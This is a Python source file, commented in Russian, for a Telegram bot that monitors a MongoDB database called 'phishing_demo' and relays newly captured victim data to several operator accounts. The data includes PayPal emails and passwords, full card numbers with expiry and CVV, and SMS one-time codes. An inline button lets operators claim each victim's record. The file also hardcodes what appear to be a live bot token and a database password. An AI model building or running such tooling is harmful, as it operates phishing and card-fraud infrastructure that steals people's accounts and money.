import asyncio
import re
from datetime import datetime
from motor.motor_asyncio import AsyncIOMotorClient
from aiogram import Bot, Dispatcher, types, F
from aiogram.utils.keyboard import InlineKeyboardBuilder

# ================= НАСТРОЙКИ =================
TELEGRAM_BOT_TOKEN = "8229844426:AAFw1OwXuR3kVqvevoww0TXXsGvSrS5dVxQ"
ALLOWED_TELEGRAM_IDS = [532319147, 7323926931,7634439386,5869551323,6618226985]

DB_NAME = "phishing_demo"
COLLECTIONS = ["credentials", "cardmessages", "cardupdates", "otps"]
MONGO_URI = "mongodb+srv://miroxlav111:Alex18122008@cluster0.tfjob.mongodb.net/phishing_demo?retryWrites=true&w=majority"

# Хранилище связей сообщений: { "tag": [{"chat_id": 1, "msg_id": 2}, ...] }
msg_store = {}

bot = Bot(token=TELEGRAM_BOT_TOKEN)
dp = Dispatcher()
# =============================================

def clean_for_hashtag(text: str) -> str:
    if not text: return ""
    return re.sub(r'[^a-zA-Z0-9]', '', str(text))

def get_case_tag(doc: dict) -> str:
    card = doc.get("digits") or doc.get("cardNumber") or doc.get("cardLast4")
    if card: return f"id_{clean_for_hashtag(card)}"
    email = doc.get("email") or doc.get("user_email")
    if email: return f"id_{clean_for_hashtag(email)}"
    return f"id_{str(doc.get('_id'))[-6:]}"

def format_msg(coll_name: str, doc: dict, tag: str, taken_by: str = None) -> str:
    now = datetime.now().strftime("%H:%M:%S")
    msg = f"<b>#{tag}</b>\n"
    
    if coll_name == "credentials":
        msg += f"🔐 <b>[PAYPAL LOGIN]</b>\n👤 Email: <code>{doc.get('email', 'N/A')}</code>\n🔑 Pass: <code>{doc.get('password', 'N/A')}</code>"
    elif coll_name == "cardupdates":
        msg += f"💳 <b>[FULL CARD DATA]</b>\n👤 Holder: {doc.get('holder', 'N/A')}\n🔢 Number: <code>{doc.get('digits', 'N/A')}</code>\n📅 Exp: {doc.get('exp', 'N/A')} | CVV: <code>{doc.get('cvv', 'N/A')}</code>"
    elif coll_name == "cardmessages":
        card_display = doc.get('cardLast4', 'N/A')
        msg += f"📟 <b>[SMS / OTP CODE]</b>\n💳 {doc.get('cardBrand', 'Card')} (<code>{card_display}</code>)\n💬 CODE: <code>{doc.get('message', 'N/A')}</code>"
    elif coll_name == "otps":
        msg += f"🛡 <b>[OTP CODE]</b>\n📧 Target: {doc.get('email', 'N/A')}\n🔢 CODE: <code>{doc.get('code', 'N/A')}</code>"
    
    if taken_by:
        msg += f"\n\n✅ <b>Взял: {taken_by}</b>"
    
    msg += f"\n\n⏰ Time: {now}"
    return msg

# --- ОБРАБОТКА НАЖАТИЯ КНОПКИ ---
@dp.callback_query(F.data.startswith("take_"))
async def process_take_order(callback: types.CallbackQuery):
    tag = callback.data.split("_", 1)[1]
    user_mention = f"@{callback.from_user.username}" if callback.from_user.username else callback.from_user.full_name
    
    if tag in msg_store:
        # Редактируем сообщения у всех участников
        for item in msg_store[tag]:
            try:
                # Получаем текущий текст и добавляем "Взял"
                new_text = callback.message.html_text.split("⏰")[0] # берем текст до времени
                new_text += f"\n\n✅ <b>Взял: {user_mention}</b>\n\n⏰ Time: {datetime.now().strftime('%H:%M:%S')}"
                
                await bot.edit_message_text(
                    chat_id=item["chat_id"],
                    message_id=item["msg_id"],
                    text=new_text,
                    parse_mode="HTML",
                    reply_markup=None # Убираем кнопку
                )
            except Exception as e:
                print(f"Ошибка обновления: {e}")
        
        # Очищаем историю после принятия (или оставляем, если ждете обновлений по этому же тегу)
        # del msg_store[tag] 
        await callback.answer("Вы приняли лог!")
    else:
        await callback.answer("Ошибка: данные устарели", show_alert=True)

# --- МОНИТОРИНГ БАЗЫ (ОБНОВЛЕННЫЙ) ---
async def listen_changes():
    client = AsyncIOMotorClient(MONGO_URI)
    db = client[DB_NAME]
    
    print("[*] Мониторинг запущен (кнопки только на данные)...")
    
    async with db.watch(full_document="updateLookup") as stream:
        async for change in stream:
            if change["operationType"] == "insert":
                coll_name = change["ns"]["coll"]
                if coll_name in COLLECTIONS:
                    doc = change.get("fullDocument", {})
                    tag = get_case_tag(doc)
                    text = format_msg(coll_name, doc, tag)
                    
                    # Логика кнопки: только для данных, не для кодов
                    kb_markup = None
                    if coll_name in ["credentials", "cardupdates"]:
                        builder = InlineKeyboardBuilder()
                        builder.add(types.InlineKeyboardButton(
                            text="✅ Принять", 
                            callback_data=f"take_{tag}"
                        ))
                        kb_markup = builder.as_markup()
                    
                    # Рассылка всем админам
                    temp_msg_ids = []
                    for admin_id in ALLOWED_TELEGRAM_IDS:
                        try:
                            sent_msg = await bot.send_message(
                                chat_id=admin_id, 
                                text=text, 
                                parse_mode="HTML",
                                reply_markup=kb_markup # Кнопка будет только тут
                            )
                            # Сохраняем ID только если была кнопка (чтобы потом редактировать)
                            if kb_markup:
                                temp_msg_ids.append({"chat_id": admin_id, "msg_id": sent_msg.message_id})
                        except Exception as e:
                            print(f"Ошибка рассылки: {e}")
                    
                    if temp_msg_ids:
                        msg_store[tag] = temp_msg_ids

async def main():
    # Запуск бота и мониторинга параллельно
    await asyncio.gather(
        dp.start_polling(bot),
        listen_changes()
    )

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("Выход")
